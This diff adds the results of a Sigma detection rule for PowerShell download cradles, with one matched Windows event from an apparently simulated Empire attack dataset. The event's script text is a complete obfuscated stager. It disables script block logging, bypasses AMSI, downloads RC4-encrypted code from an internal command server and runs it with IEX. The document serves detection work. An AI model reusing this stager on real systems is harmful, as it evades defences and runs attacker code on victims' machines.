@@ -1,0 +1,56 @@
+[{
+  "title": "PowerShell Web Download Cradle Via Script Block Logging",
+  "id": "7344d6a1-f035-4997-9b19-40b13f8fddfd",
+  "description": "Detects PowerShell download cradles in Script Block Logging (EID 4104) that combine a\nnetwork-download primitive (Net.WebClient / DownloadFile / DownloadString / Invoke-WebRequest)\nwith an execution or in-memory follow-on (Invoke-Item, Invoke-Expression/IEX, Start-Process,\nor a TLS SecurityProtocol pin). This is a common first-stage malware pattern (e.g. Emotet\ndownloaders). Sigma string matching is case-insensitive by default, so heavily mixed-case /\nconcatenation-obfuscated variants are matched without enumerating every casing.\n",
+  "sigmafile": "",
+  "sigma": [
+    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND ((ScriptBlockText LIKE '%Net.WebClient%' ESCAPE '\\' OR ScriptBlockText LIKE '%.DownloadFile(%' ESCAPE '\\' OR ScriptBlockText LIKE '%.DownloadString(%' ESCAPE '\\' OR ScriptBlockText LIKE '%.DownloadData(%' ESCAPE '\\' OR ScriptBlockText LIKE '%Invoke-WebRequest%' ESCAPE '\\' OR ScriptBlockText LIKE '%Start-BitsTransfer%' ESCAPE '\\') AND (ScriptBlockText LIKE '%Invoke-Item%' ESCAPE '\\' OR ScriptBlockText LIKE '%Invoke-Expression%' ESCAPE '\\' OR ScriptBlockText LIKE '%IEX %' ESCAPE '\\' OR ScriptBlockText LIKE '%IEX(%' ESCAPE '\\' OR ScriptBlockText LIKE '%Start-Process%' ESCAPE '\\' OR ScriptBlockText LIKE '%Net.ServicePointManager%' ESCAPE '\\' OR ScriptBlockText LIKE '%FromBase64String%' ESCAPE '\\')))"
+  ],
+  "rule_level": "high",
+  "tags": [
+    "attack.execution",
+    "attack.t1059.001"
+  ],
+  "count": 1,
+  "matches": [
+    {
+      "row_id": 1,
+      "AccountName": "SYSTEM",
+      "AccountType": "User",
+      "ActivityID": "{9D5ADC19-303C-0000-E533-A494DD8DD601}",
+      "Category": "Execute a Remote Command",
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Domain": "NT AUTHORITY",
+      "ERROREVTUNRESOLVED": 1,
+      "EventID": 4104,
+      "EventReceivedTime": "2020-09-20 02:57:49",
+      "EventTime": "2020-09-20 02:57:48",
+      "EventType": "WARNING",
+      "ExecutionProcessID": 1152,
+      "Hostname": "WORKSTATION6.theshire.local",
+      "Keywords": 0,
+      "MessageNumber": "1",
+      "MessageTotal": "1",
+      "Opcode": "On create calls",
+      "OpcodeValue": 15,
+      "OriginalLogfile": "empire_smbexec_dcerpc_smb_svcctl_2020-09-20025716.json",
+      "ProviderGuid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
+      "RecordNumber": 6084,
+      "ScriptBlockId": "9f63c3d4-dd42-47f7-86c1-4076ce091501",
+      "ScriptBlockText": "IF($PSVERsioNTaBLE.PSVErsIOn.MajOR -ge 3){$6866=[REf].AsseMBLY.GetTYpE('System.Management.Automation.Utils').\"GetFiE`Ld\"('cachedGroupPolicySettings','N'+'onPublic,Static');If($6866){$1FE7=$6866.GetVALue($nulL);IF($1Fe7['ScriptB'+'lockLogging']){$1FE7['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$1fe7['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$Val=[CollECtiONs.GENeRic.DIcTionARy[STRiNg,SysTeM.ObjEcT]]::New();$vaL.Add('EnableScriptB'+'lockLogging',0);$vAL.AdD('EnableScriptBlockInvocationLogging',0);$1fE7['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging']=$vAl}ElSe{[ScriPtBlOCK].\"GetFIe`lD\"('signatures','N'+'onPublic,Static').SetVALUE($NUll,(NeW-OBJECT COLleCtiONS.GEnERiC.HasHSet[strInG]))}$Ref=[ReF].ASSEMbLy.GetTYpe('System.Management.Automation.Amsi'+'Utils');$ReF.GetFiELd('amsiInitF'+'ailed','NonPublic,Static').SeTValue($nulL,$truE);};[SysTEM.NET.SerVICePOintManAgEr]::EXpECt100CoNtinUE=0;$F94E=NEW-ObjEcT SySteM.NEt.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.EnCODiNg]::UnICOdE.GETSTRING([ConvERT]::FRoMBASe64StRING('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/login/process.php';$f94e.HeADeRs.ADd('User-Agent',$u);$f94E.PROXY=[SYStem.NEt.WeBREqUeST]::DeFAuLtWebProxY;$F94E.ProxY.CReDentIals = [SYSteM.NEt.CREDentIaLCAChe]::DefauLTNeTwOrKCreDentIALs;$Script:Proxy = $f94e.Proxy;$K=[SyStEm.TEXT.ENcODinG]::ASCII.GEtBYtes('0]rX3Y4:()JchAKkR7Vg+[/Up92tmGQv');$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXOr$S[($S[$I]+$S[$H])%256]}};$f94E.HeadeRS.ADd(\"Cookie\",\"uoSWohnlCYlf=OlK76984qm6buWQqg5rtB+yku8A=\");$dAtA=$F94E.DowNloadData($ser+$T);$iv=$DaTa[0..3];$data=$DATa[4..$DAta.lenGTH];-JOiN[Char[]](&amp; $R $dAtA ($IV+$K))|IEX",
+      "Severity": "WARNING",
+      "SeverityValue": 3,
+      "SourceModuleName": "eventlog",
+      "SourceModuleType": "im_msvistalog",
+      "SourceName": "Microsoft-Windows-PowerShell",
+      "Task": 2,
+      "ThreadID": 8724,
+      "UserID": "S-1-5-18",
+      "Version": "1",
+      "host": "wec.internal.cloudapp.net",
+      "port": 64545,
+      "tags": "['mordorDataset']",
+      "timestamp": "2020-09-20T06:57:49.169Z"
+    }
+  ]
+}]
